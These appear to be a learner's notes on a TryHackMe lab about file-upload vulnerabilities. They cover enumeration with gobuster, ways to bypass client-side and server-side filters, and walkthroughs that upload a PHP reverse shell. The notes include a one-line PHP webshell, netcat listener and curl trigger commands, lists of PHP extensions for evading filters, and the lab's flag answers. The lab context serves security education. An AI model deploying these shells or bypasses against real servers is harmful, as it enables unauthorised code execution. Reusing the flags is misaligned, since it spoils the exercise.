# Upload Vulnerabilities


## Intro
- If not handled well, file uploads can result in full Remote Code Execution (RCE), webpage injection, and XSS or CSRF vulnerabilities
- If users are allowed to upload arbitrary files they can use the server to host illegal content or leak sensitive information


## General Methodology
- Enumeration is key
- Look at source code, scan with a directory bruteforcer like gobuster, intercept web requests with burpsuite, and check out browser extensions like wappalyser
- If client-side filtering is used for the upload then we can easily see the code and bypass it
- If server-side filtering is being used we need to experiment by uploading files
    - Burpsuite or OWASP Zap are helpful here


## Overwriting Existing Files
- When files are uplaoded, a range of checks should be performed to ensure that the file doesn't overwrite an already existing file
- Common practice is assigning a random name or with the data and time of uplaod added to the start or end of the original filename
- File permissions should be in place to prevent overwriting
### Overwriting the file
1. Go to the website, right click, and view page source
2. `<img src="images/mountains.jpg" alt="">` We see that the name of the image is "mountains.jpg'
3. Now we download an image, name it mountains.jpg, and upload the file
4. The flag we get is THM{OTBiODQ3YmNjYWZhM2UyMmYzZDNiZjI5}


## Remote Code Execution (RCE)
- Allows us to execute code arbitratily on the web server
- Result of uploading a program written in the same language as the back-end of the website (or another language that the server understands and will execute)
    - Traditionally the language is php, but other now other back-end languages have become more common: Python Django and Javascript in Node.js
- 2 ways to achieve RCE: webshells and reverse shells
    - A fully featured reverse shell is ideal goal, but webshell may be the only option available
- General methodology: Upload a shell, activate it by nagivating to the file on the server or force the webapp to run it for us
- Simple php webshell
><?php
>    echo system($_GET["cmd"]);
>?>
### Reverse Shell
1. Use gobuster to find hidden directories `gobuster -w /usr/share/wordlists/dirb/common.txt -u http://shell.uploadvulns.thm`, /resources is probably used to store uploaded files
>root@ip-10-10-154-247:~# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://shell.uploadvulns.thm
>===============================================================
>Gobuster v3.0.1
>by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
>===============================================================
>[+] Url:            http://shell.uploadvulns.thm
>[+] Threads:        10
>[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
>[+] Status codes:   200,204,301,302,307,401,403
>[+] User Agent:     gobuster/3.0.1
>[+] Timeout:        10s
>===============================================================
>2021/11/27 01:57:10 Starting gobuster
>===============================================================
>/.htaccess (Status: 403)
>/.hta (Status: 403)
>/.htpasswd (Status: 403)
>/assets (Status: 301)
>/favicon.ico (Status: 200)
>/index.php (Status: 200)
>/resources (Status: 301)
>/server-status (Status: 403)
>===============================================================
>2021/11/27 01:57:13 Finished
>===============================================================

2. Edit the ip address and port on the [Monkey Pentest Reverse Shell script](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) and upload it to the server
3. Start a netcat listener on the port specified in the script `nc -nvlp 6000`
4. Launch the script with `curl http://shell.uploadvulns.thm/resources/scriptName`
5. Go to the /var/www directory and cat the flag.txt file to find THM{YWFhY2U3ZGI4N2QxNmQzZjk0YjgzZDZk}


## Filtering
- Client Side Filtering
    - It's running on the user's browser, and is easy to bypass because user can manipulate code
- Server Side Filtering
    - More difficult to bypass because it's running on server, in most cases is impossible to bypass entirely
### Filtering Types
- Extension validation
    - Used to identify (in theory) the contents of a file
    - In practice they're very easy to change and spoof, but windows uses them to identify file types, while unix based systems use magic numbers
    - Filters that check for extensions either _blacklist_or _whitelist_ extensions; they have a list of extensions that are allowed, and block everything else
- File type filtering
    - More intensive than extension validation
    - 2 types of file type filtering
        - MIME (Multipurpose Internet Mail Extension) validation
            - Used as an identifier for files that are transferred as attachments over email and http(s)
            - MIME type for a file upload is attached in the header of the request
            - Follow the format `<type>/<subtype>`
                - "spaniel.jpg" would be "image/jpeg"
            - Because MIME is based on the extension of the file like extension validation, it's easy to bypass
        - Magic Number Validation
            - Are more accurate of determining the contents of a file, but are not impossible to spoof
            - Magic number is a string of bytes at the beginning of the file content that identifies the content
                - Many sources to view which string of bytes correlate with a certain file type [gist](https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5), [wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures)
- File Length Filtering
    - Prevent huge files from being uploaded to the server
    - Will likely not cause issues when uploading shells, but alternative shells may need to be used depending on file size
- File Name Filtering
    - Files uploaded to a server should be unique
        - Either add a random aspect to file
        - Or check if a file with the same name exists and give an error if true
    - Files should be sanitised on upload to verify they don't contain any characters that could cause problems on the system
        - Null bytes or forward slashes on linux or control characters such as `;` or unicode characters
    - Files are unlikely to have the same file name once they are uploaded to server

- None of these are perfect; most of the time the filters will be used in conjunction with one another
- Different frameworks and languages come up with their own methods of filtering, and it's possible to encounter language specific exploits to appear
    - PHP
        - Until php5, it was possible to bypass an extension filter by appending a null byte
        - It was also possible to inject php code into the exif data of an image file and force the server to execute it
### Questions
1. php
2. whitelist
3. MIME type for csv files is text/csv


## Bypassing Client Side Filtering
- Easy to bypass because it's on the machine that you control
- 4 methods
    1. Turn off javascript in your browser
        - This will work if the site doesn't require js to provide basic functionality; if it does, then use other methods
    2. Intercept and modify the incoming page
        - Using burpsuite, intercept the incoming webpage and strip out the js filter before it can run
    3. Intercept and modify the file upload
        - Intercept the file upload after it's already passed and been accepted by the filter
    4. Send the file directly to the upload point
        - Use developer console or burpsuite to intercept a successful upload, see which parameters are being used, and emulate the upload with a malicious file with a tool like curl
### Exercise
1. View page source, we see a javescript file being included from 'assets/js/' called 'client-side-filter.js'
2. Enumerate website with gobuster: `gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://java.uploadvulns.thm`
>root@ip-10-10-53-163:~# gobuster  dir -w /usr/share/wordlists/dirb/common.txt -u http://java.uploadvulns.thm
>===============================================================
>Gobuster v3.0.1
>by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
>===============================================================
>[+] Url:            http://java.uploadvulns.thm
>[+] Threads:        10
>[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
>[+] Status codes:   200,204,301,302,307,401,403
>[+] User Agent:     gobuster/3.0.1
>[+] Timeout:        10s
>===============================================================
>2021/11/28 19:07:11 Starting gobuster
>===============================================================
>/.htpasswd (Status: 403)
>/.hta (Status: 403)
>/.htaccess (Status: 403)
>/assets (Status: 301)
>/favicon.ico (Status: 200)
>/images (Status: 301)
>/index.php (Status: 200)
>/server-status (Status: 403)
>===============================================================
>2021/11/28 19:07:14 Finished
>===============================================================
3. Navigate to http://java.uploadvulns.thm/assets/js/ and view 'client-side-filter.js'. We see that it's checking for a MIME type of "image/png"
>window.onload = function(){
>	var upload = document.getElementById("fileSelect");
>	var responseMsg = document.getElementsByClassName("responseMsg")[0];
>	var errorMsg = document.getElementById("errorMsg");
>	var uploadMsg = document.getElementById("uploadtext");
>	upload.value="";
>	upload.addEventListener("change",function(event){
>		var file = this.files[0];
>		responseMsg.style = "display:none;";
>		if (file.type != "image/png"){
>			upload.value = "";
>			uploadMsg.style = "display:none;";
>			error();
>		} else{
>			uploadMsg.innerHTML = "Chosen File: " + upload.value.split(/(\\|\/)/g).pop();
>			responseMsg.style="display:none;";
>			errorMsg.style="display:none;";
>			success();
>		}
>	});
>};
4. Set up [Burpsuite](https://tryhackme.com/resources/blog/setting-up-burp) to be able to capture traffic. After setting it up, reload http://java.uploadvulns.thm and the traffic should be displayed in the Proxy > Intercept tab. The webpage should appear to be loading indefinitely
5. Delete the script tag that links the 'client-side-filter.js' to the html
6. Right click > Do Intercept > Response to this request. Then click Forward until the webpage finishes loading
7. Now prepare the [Monkey Pentest Reverse Shell script](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) and upload it to the server. There should be no error because we removed the filtering restrictions
8. Set up netcat with the port specified in the script `nc -nvlp 6000`
9. Execute the script with curl
10. `cat /var/www/flag.txt` to get THM{NDllZDQxNjJjOTE0YWNhZGY3YjljNmE2}


## Bypassing Server Side Filtering: File Extensions
- We can't see server side filters, so we have to try to upload various files and examine the results
- We need to look for flaws in the filters and try to exploit them; enumerate and see what is allowed/blocked, then craft a payload that can pass the criteria the filter is looking for
- A few methods if a file is blocked by the filter
    - Look for other extensions that are associated with the file type and try those; some servers may not be configured to block all the file extensions
        - Ex. If .php is blocked, try .phtml, .php3, .php4, .php5, .php7, .phps, .php-s, .pht, .phar, etc.
    - If you know a file type that is accepted, try tricking the code by mixing up the extensions
        - Ex. If you know that .jpg is accepted but .php isn't, try .jpg.php
### Exercise
1. Enumerate `gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://annex.uploadvulns.thm`
>root@ip-10-10-223-207:~# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://annex.uploadvulns.thm
>===============================================================
>Gobuster v3.0.1
>by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
>===============================================================
>[+] Url:            http://annex.uploadvulns.thm
>[+] Threads:        10
>[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
>[+] Status codes:   200,204,301,302,307,401,403
>[+] User Agent:     gobuster/3.0.1
>[+] Timeout:        10s
>===============================================================
>2021/11/29 05:50:11 Starting gobuster
>===============================================================
>/.htaccess (Status: 403)
>/.hta (Status: 403)
>/.htpasswd (Status: 403)
>/assets (Status: 301)
>/favicon.ico (Status: 200)
>/index.php (Status: 200)
>/privacy (Status: 301)
>/server-status (Status: 403)
>===============================================================
>2021/11/29 05:50:14 Finished
>===============================================================
2. Download a jpg file and upload it to the website, and it gets accepted by the filter. From the gobuster results, /privacy seems to be suspicious, and when we check http://annex.uploadvulns.thm/privacy/ we see that our file has been saved to that directory
3. Prepare the [Monkey Pentest Reverse Shell script](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) and try to upload it, but it doesn't get accepted
4. Try the first method from this section, where we find alternative extensions for php files. Rename the script to have an extension of .php5 and try to upload it again. It gets accepted
5. Set up netcat listener on the port specified in script `nc -nvlp 6000`
6. Use curl to execute the file on the server `curl http://annex.uploadvulns.thm/privacy/2021-11-29-05-54-08-php-reverse-shell.php5`
7. Once you have a shell, use `cat /var/www/flag.txt` to get THM{MGEyYzJiYmI3ODIyM2FlNTNkNjZjYjFl}
